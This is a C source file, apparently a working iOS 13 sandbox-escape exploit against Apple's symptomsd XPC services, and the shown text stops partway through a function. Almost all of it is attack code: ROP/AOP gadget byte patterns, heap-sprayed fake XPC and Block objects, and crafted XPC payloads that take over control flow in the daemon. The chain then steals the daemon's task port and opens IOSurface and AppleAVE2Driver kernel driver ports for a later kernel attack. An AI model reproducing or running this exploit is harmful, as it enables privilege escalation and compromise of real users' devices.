//
//  ios13_userspace.c
//  ios13_app1
//
//  Created by bb on 1/12/20.
//  Copyright © 2020 bb. All rights reserved.
//

// Update* For 13.4/13.4.1 Support, started using AOP instead of ROP

#if !__arm64e__

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <string.h>
#include <setjmp.h>
#include <dlfcn.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <mach/mach.h>
#include <mach/vm_map.h>
#include <mach-o/dyld.h>
#include <mach-o/loader.h>
#include <mach-o/dyld_images.h>
#include <objc/runtime.h>
#include <objc/message.h>
#include <pthread/pthread.h>
#include <copyfile.h>
#include <CoreFoundation/CoreFoundation.h>
#include <sys/time.h>
#include <sys/utsname.h>
#include "IOKitLib.h"
#include "xpc.h"

extern kern_return_t bootstrap_look_up(mach_port_t bp, char *service_name, mach_port_t *sp);

#pragma pack(4)

#define SPRAY_ADDRESS 0x150010000

#define TARGET_MACH_SERVICE "com.apple.usymptomsd"
#define TARGET_MACH_SERVICE_2 "com.apple.symptoms.symptomsd.managed_events"

#define OF(offset) (offset)/sizeof(uint64_t)
#define exit(X) longjmp(jmpb, 1)

jmp_buf jmpb;

#define MACH_MSG_GUARD_FLAGS_NONE                   0x0000
#define MACH_MSG_GUARD_FLAGS_IMMOVABLE_RECEIVE      0x0001    /* Move the receive right and mark it as immovable */
#define MACH_MSG_GUARD_FLAGS_UNGUARDED_ON_SEND      0x0002    /* Verify that the port is unguarded */
#define MACH_MSG_GUARD_FLAGS_MASK                   0x0003    /* Valid flag bits */

typedef unsigned int mach_msg_guard_flags_t;

/*#define MACH_MSG_GUARDED_PORT_DESCRIPTOR        4
 #pragma pack(4)
 typedef struct{
 uint64_t                      context;
 mach_msg_guard_flags_t        flags : 16;
 mach_msg_type_name_t          disposition : 8;
 mach_msg_descriptor_type_t    type : 8;
 mach_port_name_t              name;
 } mach_msg_guarded_port_descriptor_t;
 */

#pragma mark - Pre-exploitation - Our Mach Server

mach_port_t our_serverport = 0;
void Prepare_our_Mach_server(){
    
    kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &our_serverport);
    if(our_serverport == 0){
        printf("Error occurred when mach_port_allocate: 0x%x!\n", kr);
        exit();
    }
}

#pragma mark - Pre-exploitation - dyldcache

void *dylibcache_start = NULL;
size_t dylibcache_size = 0;

bool isPartOf_dyldcache(vm_address_t addr){
    vm_size_t size = 0;
    natural_t depth = 0;
    vm_region_submap_info_data_64_t info;
    mach_msg_type_number_t info_cnt = VM_REGION_SUBMAP_INFO_COUNT_64;
    if(vm_region_recurse_64(mach_task_self(), &addr, &size, &depth, (vm_region_info_t)&info, &info_cnt))
        return false;
    if(info.share_mode == SM_TRUESHARED)
        return true;
    return false;
}

size_t Get_loaded_dylib_size(void *dylib_address){
    
    struct mach_header *mh = (struct mach_header*)dylib_address;
    const uint32_t cmd_count = mh->ncmds;
    struct load_command *cmds = (struct load_command*)((char*)mh+sizeof(struct mach_header_64));
    struct load_command* cmd = cmds;
    for (uint32_t i = 0; i < cmd_count; ++i){
        switch (cmd->cmd) {
            case LC_SEGMENT_64:{
                struct segment_command_64 *seg = (struct segment_command_64*)cmd;
                if(!strcmp(seg->segname,"__TEXT")){
                    return seg->vmsize;
                }
            }
                break;
        }
        cmd = (struct load_command*)((char*)cmd + cmd->cmdsize);
    }
    return 0;
}

void Find_dylibcache(){
    
    vm_address_t minAddr = 0;
    vm_address_t maxAddr = 0;
    
    for (uint32_t i = 0; i < _dyld_image_count(); i++){
        uint64_t addr = (uint64_t)_dyld_get_image_header(i);
        const char *name = _dyld_get_image_name(i);
        if(strncmp(name, "/System/", 8) && strncmp(name, "/usr/", 5))
            continue;
        if(!isPartOf_dyldcache(addr))
            continue;
        if(!minAddr || addr < minAddr)
            minAddr = addr;
        if(addr > maxAddr)
            maxAddr = addr;
    }
    
    if(!minAddr||!maxAddr){
        printf("dylibcache Not Ready!\n");
        exit();
    }
    
    size_t last_dylib_size = Get_loaded_dylib_size((void*)maxAddr);
    
    dylibcache_start = (void*)minAddr;
    dylibcache_size = (size_t)((maxAddr + last_dylib_size) - minAddr);
    
    printf("Dylibcache range: %p - %p\n", dylibcache_start, dylibcache_start + dylibcache_size);
}

#pragma mark - Pre-exploitation - arm64 ROP gadgets

uint64_t find_gadget(char *bytes, size_t len){
    void *addr = memmem(dylibcache_start, dylibcache_size, bytes, len);
    if(!addr){
        printf("Gadget didn't find, len:0x%zx\n",len);
        exit();
    }
    return (uint64_t)addr;
}

uint64_t find_gadget_speed(char *bytes, size_t len, void *findingRange_start, uint64_t findingRange_size){
    void *addr = memmem(findingRange_start, findingRange_size, bytes, len);
    if(!addr){
        printf("Gadget didn't find, len:0x%zx\n",len);
    }
    return (uint64_t)addr;
}

char _bytes_control_x0x2[] = {
    0xF3, 0x03, 0x00, 0xAA, // mov    x19, x0
    0x08, 0x00, 0x42, 0xA9, // ldp    x8, x0, [x0, #0x20]
    0x61, 0x3A, 0x40, 0xB9, // ldr    w1, [x19, #0x38]
    0x62, 0x1A, 0x40, 0xF9, // ldr    x2, [x19, #0x30]
    0x00, 0x01, 0x3f, 0xd6, // blr x8
}; // Found at CoreUtils`___WiFiSWAPStartCallBack_block_invoke: <+16>
#define _Gadget_control_x0x2 find_gadget_speed(_bytes_control_x0x2,sizeof(_bytes_control_x0x2),findingRange_start,findingRange_size)
uint64_t Gadget_control_x0x2 = 0;

char _bytes_memcopy[] = {
    0x08, 0x00, 0x40, 0xB9, // ldr    w8, [x0]
    0x68, 0x00, 0x00, 0xB9, // str    w8, [x3]
    0xC0, 0x03, 0x5F, 0xD6, // ret
}; // Found at libwebrtc.dylib`ScaleARGBRowDownEven_C: <+68>
#define _Gadget_memcopy find_gadget_speed(_bytes_memcopy,sizeof(_bytes_memcopy),findingRange_start,findingRange_size)
uint64_t Gadget_memcopy = 0;

#define aop_FuncCALL(FUNC, ARG1, ARG2, ARG3, ARG4) \
spraymem[OF(_aop_FuncCALL_primer_offset)] = spray_start_address + _aop_FuncCALL_offset; \
{char *func_call_payload = ((char*)spraymem) + _aop_FuncCALL_offset; \
_aop_FuncCALL_primer_offset += 8; \
_aop_FuncCALL_offset += 0x74; \
*(uint32_t*)(func_call_payload + 20) = 53; \
*(uint64_t*)(func_call_payload) = 0; \
*(uint32_t*)(func_call_payload + 8) = 0; \
char *tmp_ha = func_call_payload + 24; /* Saved an offset later gonna involves multiple time */ \
*(uint32_t*)(tmp_ha + 4) = 150; \
*(uint32_t*)(func_call_payload + 4) = 116; \
*(uint64_t*)(tmp_ha + 16) = FUNC; /* func ptr */ \
*(uint64_t*)(tmp_ha + 24) = ARG1; /* arg1 */ \
*(uint32_t*)(tmp_ha + 72) = ARG2; /* arg2 (Only 32bits)*/ \
*(uint64_t*)(tmp_ha + 76) = ARG3; /* arg3 */ \
*(uint64_t*)(tmp_ha + 84) = ARG4;} // arg4

#define aop_FuncCALL_memcpy_32bits(dst, src) \
aop_FuncCALL((void*)Gadget_memcopy, src, 0, 0, dst)

#define aop_Insert_String(VAR, STR) \
size_t _##VAR##_len = strlen(STR) + 1; \
uint64_t VAR = spray_start_address + _aop_data_offset; \
memcpy((char*)spraymem + _aop_data_offset, STR, _##VAR##_len); \
_##VAR##_len = (~0xF) & (_##VAR##_len + 0xF); \
_aop_data_offset += _##VAR##_len;

#define aop_Insert_Data(VAR, DATA, SIZE) \
size_t _##VAR##_SIZE = SIZE; \
uint64_t VAR = spray_start_address + _aop_data_offset; \
memcpy((char*)spraymem + _aop_data_offset, DATA, _##VAR##_SIZE); \
_##VAR##_SIZE = (~0xF) & (_##VAR##_SIZE + 0xF); \
_aop_data_offset += _##VAR##_SIZE;

void Find_Gadgets_speed(){
    
#define _SEEK(V) if(!(V = _##V)){printf("No "#V" Found!\n");exit(0);}
    
    const char *target_lib_1 = "/System/Library/PrivateFrameworks/CoreUtils.framework/CoreUtils";
    const char *target_lib_2 = "/System/Library/PrivateFrameworks/WebCore.framework/Frameworks/libwebrtc.dylib";
    
    dlopen(target_lib_1, RTLD_NOW);
    dlopen(target_lib_2, RTLD_NOW);
    
    for (uint32_t i = 0; i < _dyld_image_count(); i++){
        
        const char *name = _dyld_get_image_name(i);
        if(!strcmp(name, target_lib_1)){
            
            void *findingRange_start = (void*)_dyld_get_image_header(i);
            uint64_t findingRange_size = (uint64_t)Get_loaded_dylib_size(findingRange_start);
            _SEEK(Gadget_control_x0x2);
        }
        else if(!strcmp(name, target_lib_2)){
            
            void *findingRange_start = (void*)_dyld_get_image_header(i);
            uint64_t findingRange_size = (uint64_t)Get_loaded_dylib_size(findingRange_start);
            _SEEK(Gadget_memcopy);
        }
    }
}

uint32_t get_server_port(char *servername){
    // Can use for check connection as well
    uint32_t port = 0;
    bootstrap_look_up(bootstrap_port, servername, &port);
    if(!port){
        printf("%s lookup failed\n", servername);
        return 0;
    }
    printf("got server: 0x%x\n", port);
    return port;
}

void mach_msg_conn_test(){
    
    printf("w\n");
    mach_port_t server_port = get_server_port("");
    printf("server_port: 0x%x\n", server_port);
    
    struct routine1_msg{
        mach_msg_header_t Head;
        mach_msg_body_t msgh_body;
        mach_msg_ool_descriptor_t ool;
        mach_msg_port_descriptor_t port;
        mach_msg_trailer_t trailer;
    };
    
    struct routine1_msg *msg = malloc(sizeof(struct routine1_msg));
    bzero(msg, sizeof(struct routine1_msg));
    
    mach_port_t reply_port = mig_get_reply_port();
    
    msg->Head.msgh_bits = MACH_MSGH_BITS_COMPLEX|MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    msg->Head.msgh_size = 80;
    msg->Head.msgh_remote_port = server_port;
    msg->Head.msgh_local_port = reply_port;
    msg->Head.msgh_id = 0x6F0;
    msg->msgh_body.msgh_descriptor_count = 2;
    
    mach_port_t shared_port_parent;
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &shared_port_parent);
    
    msg->port.name = server_port;
    msg->port.disposition = MACH_MSG_TYPE_MOVE_SEND;
    msg->port.type = MACH_MSG_PORT_DESCRIPTOR;
    
    msg->ool.address = "AAAAAAAAA";
    msg->ool.size = 3;
    msg->ool.copy = MACH_MSG_VIRTUAL_COPY;
    msg->ool.deallocate = false;
    msg->ool.type = MACH_MSG_OOL_DESCRIPTOR;
    
    int rt = mach_msg(msg, MACH_SEND_MSG|MACH_RCV_MSG, msg->Head.msgh_size, sizeof(struct routine1_msg), reply_port, 0, 0);
    
    if(rt == 0){
        printf("reply: 0x%x\n", msg->Head.msgh_bits);
        printf("reply size: %d\n", msg->Head.msgh_size);
        
        printf("id: %d\n", msg->Head.msgh_id);
        
    }else{
        printf("msg err: 0x%x\n", rt);
    }
}

void click_test_main(){
    mach_msg_conn_test();
}

void xpc_conn_test(){
    
    xpc_connection_t ccc = xpc_connection_create_mach_service("com.apple.usymptomsd", NULL, 0);
    xpc_connection_set_event_handler(ccc, ^(xpc_object_t object) {
        //printf("replyA\n");
        //char *err = xpc_dictionary_get_string(object, XPC_ERROR_KEY_DESCRIPTION);
        //printf("erra: %s\n", err);
    });
    xpc_connection_resume(ccc);
    
    xpc_object_t msg = xpc_dictionary_create(NULL, NULL, 0);
    //xpc_dictionary_set_int64(msg, "op", 2);
    //xpc_dictionary_set_int64(msg, "dat1", 66);
    
    size_t payload_len = 0x1;
    char *payload = malloc(payload_len);
    
    xpc_dictionary_set_value(msg, "payload", xpc_data_create(payload, payload_len));
    
    xpc_connection_send_message_with_reply(ccc, msg, dispatch_get_main_queue(), ^(xpc_object_t object) {
        
        pid_t server_pid = xpc_connection_get_pid(ccc);
        printf("server pid: %d\n", server_pid);
        
        //printf("replyB: %s\n", xpc_copy_description(object));
        
    });
}

void xpc_conn_test_exp1(){
    
    xpc_connection_t xpcconn = xpc_connection_create_mach_service("com.apple.symptoms.symptomsd.managed_events", NULL, 0);
    xpc_connection_set_event_handler(xpcconn, ^(xpc_object_t object) {
        //printf("replyA\n");
        //char *err = xpc_dictionary_get_string(object, XPC_ERROR_KEY_DESCRIPTION);
        //printf("erra: %s\n", err);
    });
    xpc_connection_resume(xpcconn);
    
    xpc_object_t msg = xpc_dictionary_create(NULL, NULL, 0);
    xpc_dictionary_set_uint64(msg, "type", 2); // case 2/3
    
    xpc_object_t config_arr = xpc_array_create(NULL, 0);
    xpc_dictionary_set_value(msg, "config", config_arr);
    
    xpc_object_t each_config = xpc_dictionary_create(NULL, NULL, 0);
    // Parse by -[ConfigurationHandler read:returnedValues:]
    xpc_array_append_value(config_arr, each_config);
    
    xpc_dictionary_set_string(each_config, "GENERIC_CONFIG_TARGET", "com.apple.symptoms.test.request-passthrough"); // [knownItems objectForKey: ???]
    
    xpc_object_t signature_arr = xpc_array_create(NULL, 0);
    xpc_dictionary_set_value(each_config, "TRIGGERED_SIGNATURES", signature_arr); // Enter -[SimpleSymptomEvaluator configureInstance:]
    
    xpc_object_t each_signature = xpc_dictionary_create(NULL, NULL, 0);
    xpc_array_append_value(signature_arr, each_signature);
    
    xpc_dictionary_set_string(each_signature, "SIGNATURE_NAME", "HAHA");
    
    xpc_dictionary_set_string(each_signature, "SYNDROME_NAME", "HAHA2");
    xpc_dictionary_set_string(each_signature, "ADDITIONAL_INFO_GENERATOR", "CertificateErrors");
    xpc_dictionary_set_string(each_signature, "ADDITIONAL_INFO_SELECTOR", "conditionMinCount");
    
    xpc_connection_send_message_with_reply(xpcconn, msg, dispatch_get_main_queue(), ^(xpc_object_t object) {
        
        //printf("replyB: %s\n", xpc_copy_description(object));
        
    });
}

void xpc_conn_test_forTrigger(){
    
    xpc_connection_t xpcconn = xpc_connection_create_mach_service("com.apple.symptoms.symptomsd.managed_events", NULL, 0);
    xpc_connection_set_event_handler(xpcconn, ^(xpc_object_t object) {
        //printf("replyA\n");
    });
    xpc_connection_resume(xpcconn);
    
    xpc_object_t msg = xpc_dictionary_create(NULL, NULL, 0);
    xpc_dictionary_set_uint64(msg, "type", 2); // case 2/3
    
    xpc_object_t config_arr = xpc_array_create(NULL, 0);
    xpc_dictionary_set_value(msg, "config", config_arr);
    
    xpc_object_t each_config = xpc_dictionary_create(NULL, NULL, 0); // Parse by -[ConfigurationHandler read:returnedValues:]
    xpc_array_append_value(config_arr, each_config);
    
    xpc_dictionary_set_string(each_config, "GENERIC_CONFIG_TARGET", "CertificateErrors"); // [knownItems objectForKey: ???]
    
    xpc_dictionary_set_string(each_config, "REQUIRED_MINIMUM_COUNT", "5637210112"); // Turn SPRAY_ADDRESS to Decimal
    
    xpc_connection_send_message_with_reply(xpcconn, msg, dispatch_get_main_queue(), ^(xpc_object_t object) {
        //printf("replyB: %s\n", xpc_copy_description(object));
    });
}

// Look up service: com.apple.usymptomsd
uint8_t bootstrap_look_up_machmsg_bytes[244] = {0x13,0x15,0x13,0x0,0xf4,0x0,0x0,0x0,0x7,0x7,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x10,0x43,0x50,0x58,0x40,0x5,0x0,0x0,0x0,0x0,0xf0,0x0,0x0,0xcc,0x0,0x0,0x0,0x8,0x0,0x0,0x0,0x73,0x75,0x62,0x73,0x79,0x73,0x74,0x65,0x6d,0x0,0x0,0x0,0x0,0x40,0x0,0x0,0x5,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x68,0x61,0x6e,0x64,0x6c,0x65,0x0,0x0,0x0,0x40,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x69,0x6e,0x73,0x74,0x61,0x6e,0x63,0x65,0x0,0x0,0x0,0x0,0x0,0xa0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x72,0x6f,0x75,0x74,0x69,0x6e,0x65,0x0,0x0,0x40,0x0,0x0,0xcf,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x66,0x6c,0x61,0x67,0x73,0x0,0x0,0x0,0x0,0x40,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x6e,0x61,0x6d,0x65,0x0,0x0,0x0,0x0,0x0,0x90,0x0,0x0,0x15,0x0,0x0,0x0,0x63,0x6f,0x6d,0x2e,0x61,0x70,0x70,0x6c,0x65,0x2e,0x75,0x73,0x79,0x6d,0x70,0x74,0x6f,0x6d,0x73,0x64,0x0,0x0,0x0,0x0,0x74,0x79,0x70,0x65,0x0,0x0,0x0,0x0,0x0,0x40,0x0,0x0,0x7,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x74,0x61,0x72,0x67,0x65,0x74,0x70,0x69,0x64,0x0,0x0,0x0,0x0,0x30,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0};

uint8_t vm_remap_machmsg_bytes[92] = {0x13,0x15,0x0,0x80,0x5c,0x0,0x0,0x0,0x11,0x11,0x11,0x11,0x22,0x22,0x22,0x22,0x0,0x0,0x0,0x0,0xcd,0x12,0x0,0x0,0x1,0x0,0x0,0x0,0x3,0x1,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x13,0x0,0x0,0x0,0x0,0x0,0x1,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x33,0x33,0x0,0x0,0x0,0x0,0x0,0x0,0xff,0xf,0x0,0x0,0x0,0x0,0x0,0x0,0x1,0x40,0x0,0x0,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0};

void Assemble_part2_AOP(uint64_t *spraymem, uint64_t spray_start_address){
    
    // Trigger vuln causing call objc_release with fake_xpcobj
    char *fake_xpcobj = (char*)spraymem;
    *(uint64_t*)fake_xpcobj = (uint64_t)dlsym((void*)-2, "_xpc_type_file_transfer");
    *(uint32_t*)(fake_xpcobj + 0xC) = 0; // set retainCnt as 0, leads to _xpc_file_transfer_dispose
    *(uint64_t*)(fake_xpcobj + 0x40) = spray_start_address + 0x48; // leads to _Block_release during disposal
    
    char *fake_Block = ((char*)spraymem) + 0x48;
    char *fake_Block_core = fake_Block + 0x40;
    
    *(uint32_t*)(fake_Block + 0x8) = 0x3000000 | 0x2; // Necessary bits mask | retainCnt
    *(uint64_t*)(fake_Block + 0x18) = (uint64_t)spray_start_address + 0x48 + 0x40;
    
    // First place got control of PC
    *(uint64_t*)(fake_Block_core + 0x18) = Gadget_control_x0x2;
    
    // --- Execute control_x0x2 gadget
    *(uint64_t*)(fake_Block + 0x20) = (uint64_t)dlsym((void*)-2, "xpc_array_apply_f"); // Next jmp
    *(uint64_t*)(fake_Block + 0x28) = spray_start_address + 0x100 - 24; // Reset x0, point to our spray mem, explicitly, a crafted xpc array
    *(uint64_t*)(fake_Block + 0x30) = (uint64_t)IODispatchCalloutFromMessage; // Reset x2
    *(uint64_t*)(fake_Block + 0x38) = 0x0; // Reset w1 (Only 32bit)
    
    /*
     Begin Array-Oriented-Programming function chain-calling
     
     Payload arrangement:
     
     0x0
     ... Used during taking control of PC
     0x100
     ... AOP array object itself
     0x118
     ... For AOP data-use
     0x1500
     ... For AOP call-use
     0x3E00
     ... AOP array storage
     0x4000
     */
    
    uint32_t _aop_FuncCALL_primer_offset = 0x3E00;
    uint32_t _aop_FuncCALL_offset = 0x1800;
    uint32_t _aop_data_offset = 0x118; // offset is right after fake array
    
    // Craft a fake array, stru has changed and req size increased to 0x18 since iOS13, was 0x10
    spraymem[OF(0x100)] = spray_start_address + _aop_FuncCALL_primer_offset; // Array internal pointer, point to stored objects pool
    spraymem[OF(0x108)] = -1; // Array count, -1 causes the array to iterate endlessly  -1
    spraymem[OF(0x110)] = 0; // new value introd since iOS13, keep it empty
    
    // --- Following are AOP data-use
    
    aop_Insert_Data(lookup_io_server_rawmsg, bootstrap_look_up_machmsg_bytes, sizeof(bootstrap_look_up_machmsg_bytes));
    *(uint64_t*)(vm_remap_machmsg_bytes + 56) = 0x4000000; // size of iosurface
    aop_Insert_Data(vm_remap_rawmsg, vm_remap_machmsg_bytes, sizeof(vm_remap_machmsg_bytes));
    
    struct {
        mach_msg_header_t Head;
        // Head.msgh_local_port: +12
        mach_msg_body_t msgh_body;
        mach_msg_port_descriptor_t our_recv_port;
        // our_recv_port.name: +28
        mach_msg_port_descriptor_t our_task_port;
        // our_task_port.name: +40
        mach_msg_port_descriptor_t IOSurfaceRoot_servport;
        // IOSurfaceRoot_servport.name: +52
        mach_msg_port_descriptor_t AppleAVE2Driver_servport;
        // AppleAVE2Driver_servport.name: +64
        mach_msg_trailer_t trailer;
    }_remote_recvmsg = {0}; // Size: 84
    _remote_recvmsg.Head.msgh_size = sizeof(_remote_recvmsg);
    
    struct {
        mach_msg_header_t Head;
        // Head.msgh_local_port: +12
        mach_msg_trailer_t trailer;
    }_remote_recvmsg2 = {0}; // Size: 32
    _remote_recvmsg2.Head.msgh_size = sizeof(_remote_recvmsg2);
    
    struct {
        mach_msg_header_t Head;
        // Head.msgh_local_port: +12
        uint64_t remote_map_addr;
        // remote_map_addr: +24
        mach_msg_trailer_t trailer;
    }_remote_recvmsg3 = {0}; // Size: 56
    _remote_recvmsg3.Head.msgh_size = sizeof(_remote_recvmsg3);
    
    struct {
        mach_msg_header_t Head;
        // Head.msgh_remote_port +8
        mach_msg_body_t msgh_body;
        mach_msg_port_descriptor_t port_send_to_us;
        // port_send_to_us.name +28
    }_remote_sendmsg = {0};
    _remote_sendmsg.Head.msgh_bits = MACH_MSGH_BITS_COMPLEX|MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    _remote_sendmsg.Head.msgh_size = sizeof(_remote_sendmsg);
    _remote_sendmsg.msgh_body.msgh_descriptor_count = 1;
    _remote_sendmsg.port_send_to_us.name = mach_task_self();
    _remote_sendmsg.port_send_to_us.disposition = MACH_MSG_TYPE_MOVE_SEND;
    _remote_sendmsg.port_send_to_us.type = MACH_MSG_PORT_DESCRIPTOR;
    
    struct {
        mach_msg_header_t Head;
    }_remote_sendmsg2 = {0};
    _remote_sendmsg2.Head.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    _remote_sendmsg2.Head.msgh_size = sizeof(_remote_sendmsg2);
    
    struct {
        mach_msg_header_t Head;
        uint64_t send_remap_addr_to_us;
        // send_remap_addr_to_us: +24
    }_remote_sendmsg3 = {0};
    _remote_sendmsg3.Head.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    _remote_sendmsg3.Head.msgh_size = sizeof(_remote_sendmsg3);
    
    aop_Insert_Data(remote_recvmsg, &_remote_recvmsg, sizeof(_remote_recvmsg));
    aop_Insert_Data(remote_recvmsg2, &_remote_recvmsg2, sizeof(_remote_recvmsg2));
    aop_Insert_Data(remote_recvmsg3, &_remote_recvmsg3, sizeof(_remote_recvmsg3));
    aop_Insert_Data(remote_sendmsg, &_remote_sendmsg, sizeof(_remote_sendmsg));
    aop_Insert_Data(remote_sendmsg2, &_remote_sendmsg2, sizeof(_remote_sendmsg2));
    aop_Insert_Data(remote_sendmsg3, &_remote_sendmsg3, sizeof(_remote_sendmsg3));
    
    // --- Following are AOP code-use
    
    // Call bootstrap_look_up to retri listening port
    aop_FuncCALL(mach_port_allocate, mach_task_self(), MACH_PORT_RIGHT_RECEIVE, lookup_io_server_rawmsg + offsetof(mach_msg_header_t, msgh_local_port), 0);
    aop_FuncCALL(mach_msg_send, lookup_io_server_rawmsg, 0, 0, 0);
    aop_FuncCALL(mach_msg_receive, lookup_io_server_rawmsg, 0, 0, 0);
    
    aop_FuncCALL_memcpy_32bits(remote_recvmsg + offsetof(mach_msg_header_t, msgh_local_port), lookup_io_server_rawmsg + 28);
    aop_FuncCALL(mach_msg_receive, remote_recvmsg, 0, 0, 0);
    aop_FuncCALL_memcpy_32bits(remote_recvmsg2+12, remote_recvmsg+12);
    aop_FuncCALL_memcpy_32bits(remote_recvmsg3+12, remote_recvmsg+12);
    aop_FuncCALL_memcpy_32bits(remote_sendmsg+8, remote_recvmsg+28);
    aop_FuncCALL_memcpy_32bits(remote_sendmsg2+8, remote_recvmsg+28);
    aop_FuncCALL_memcpy_32bits(remote_sendmsg3+8, remote_recvmsg+28);
    
    aop_FuncCALL_memcpy_32bits(vm_remap_rawmsg+8, remote_recvmsg+40);
    aop_FuncCALL(mach_port_allocate, mach_task_self(), MACH_PORT_RIGHT_RECEIVE, vm_remap_rawmsg + offsetof(mach_msg_header_t, msgh_local_port), 0);
    
    aop_FuncCALL(mach_msg_send, remote_sendmsg2, 0, 0, 0); // To inform us that pwned proc got the msg contains our port
    
    // Then passing own task port to us
    aop_FuncCALL(mach_msg_send, remote_sendmsg, 0, 0, 0);
    /*
     Reason of doing this, instead like in iOS12 exploit, open IO service port via IOServiceOpen and passing to us directly.
     iOS 13 added new mitigation prevent all IOUserClient (obtain via IOServiceOpen) port from moving to other ipc space, namely diff tasks.
     
     I supposed these port are marked as guarded port.
     
     Example crash:
     Exception Type:  EXC_GUARD
     Exception Subtype: GUARD_TYPE_MACH_PORT
     Exception Message:  on mach port 84999 (guarded with 0x0000000000000000)
     Exception Note:  SIMULATED (this is NOT a crash)
     
     Way to get around this is "passively" passing to us, like use task_get_special_port/task_set_special_port trick
     */
    
    // Opening and passing kernel driver ports to us.
    aop_FuncCALL_memcpy_32bits(spray_start_address + _aop_FuncCALL_offset + 24 + 24, remote_recvmsg+52);
    aop_FuncCALL(dlsym((void*)-2, "IOServiceOpen"), 0x414141, mach_task_self(), 0, spray_start_address + _aop_FuncCALL_offset + 24 + 76);
    
    aop_FuncCALL(task_set_special_port, mach_task_self(), TASK_SEATBELT_PORT, 0x414141, 0);
    aop_FuncCALL(mach_msg_send, remote_sendmsg2, 0, 0, 0);
    aop_FuncCALL(mach_msg_receive, remote_recvmsg2, 0, 0, 0); // Waiting for us to notify pwned proc we got the port
    
    aop_FuncCALL_memcpy_32bits(spray_start_address + _aop_FuncCALL_offset + 24 + 24, remote_recvmsg+64);
    aop_FuncCALL(dlsym((void*)-2, "IOServiceOpen"), 0x414141, mach_task_self(), 0, spray_start_address + _aop_FuncCALL_offset + 24 + 76);
    
    aop_FuncCALL(task_set_special_port, mach_task_self(), TASK_ACCESS_PORT, 0x414141, 0);
    aop_FuncCALL(mach_msg_send, remote_sendmsg2, 0, 0, 0);
    
    // Waiting for overwriting over the iosurface mapping memory, key to trigger vulnerability in kernel
    aop_FuncCALL(mach_msg_receive, remote_recvmsg3, 0, 0, 0);
    
    // Perform cross-task memory mapping
    aop_FuncCALL_memcpy_32bits(vm_remap_rawmsg+76, remote_recvmsg3+24);
    aop_FuncCALL_memcpy_32bits(vm_remap_rawmsg+80, remote_recvmsg3+28); // src addr which is the remote mapping addr
    aop_FuncCALL(mach_msg_send, vm_remap_rawmsg, 0, 0, 0);
    aop_FuncCALL(mach_msg_receive, vm_remap_rawmsg, 0, 0, 0);
    
    // send remap addr to us
    aop_FuncCALL_memcpy_32bits(remote_sendmsg3+24, vm_remap_rawmsg+36);
    aop_FuncCALL_memcpy_32bits(remote_sendmsg3+28, vm_remap_rawmsg+40); // src addr which is the remote mapping addr
    aop_FuncCALL(mach_msg_send, remote_sendmsg3, 0, 0, 0);
    
    // Block here to waiting for finish exploitation
    aop_FuncCALL(mach_msg_receive, remote_recvmsg2, 0, 0, 0);
    
    // Duty completed
    aop_FuncCALL(exit, 0, 0, 0, 0);
    
    //printf("_aop_data_offset: 0x%x\n", _aop_data_offset);
    //printf("_aop_FuncCALL_offset: 0x%x\n", _aop_FuncCALL_offset);
    //printf("_aop_FuncCALL_primer_offset: 0x%x\n", _aop_FuncCALL_primer_offset);
}

void Assemble_part1_ROP(uint64_t *rop2_stack, uint64_t rop2_start_address){
    // Still need little bit ROP to convert "retain" call into "release", from that point on, AOP gadget can be re-used
    
    rop2_stack[OF(0x0)] = rop2_start_address + 0x40;
    
    rop2_stack[OF(0x20)] = (uint64_t)dlsym((void*)-2, "objc_release"); // Next JMP
    rop2_stack[OF(0x28)] = rop2_start_address + 0x80; // Reset x0
    
    rop2_stack[OF(0x50)] = *rop2_stack + 0x28;
    rop2_stack[OF(0x58)] = 0;
    rop2_stack[OF(0x60)] = 0;
    rop2_stack[OF(0x68)] = *rop2_stack ^ Gadget_control_x0x2; // Again take over PC
    rop2_stack[OF(0x70)] = (uint64_t)sel_registerName("retain");
    
    Assemble_part2_AOP((uint64_t *)((char*)rop2_stack + 0x80), rop2_start_address + 0x80);
}

void xpc_conn_test_exp2(){
    
    xpc_connection_t xpcconn = xpc_connection_create_mach_service("com.apple.usymptomsd", NULL, 0);
    xpc_connection_set_event_handler(xpcconn, ^(xpc_object_t object) {
        printf("replyA\n");
        char *err = xpc_dictionary_get_string(object, XPC_ERROR_KEY_DESCRIPTION);
        printf("erra: %s\n", err);
    });
    xpc_connection_resume(xpcconn);
    
    size_t payload_size = 8 + 72 + 100 + 6; // payload head + 1st tlv length + 1st tlv body + beginning of 2nd tlv (To break the loop)
    char *payload = malloc(payload_size);
    bzero(payload, payload_size);
    
    // 4 + 72 + (>3)
    // _eventData: 4 ~ 72
    
    *(uint16_t*)payload = 2; // case ? for switch statement
    *(uint16_t*)(payload + 2) = 72; // len for SYMTLV_SYM_BASIC
    *(uint8_t*)(payload + 11) = 0x40; // Do not let it passes: if ( !(*(_BYTE *)(payload + 11) & 0x40) )
    *(uint16_t*)(payload + 72 + 4) = 8; // Do not let it passes: if ( *(_WORD *)(payload_ing_inner + *(uint16_t*)(payload + 2) + 4) != 8 )
    
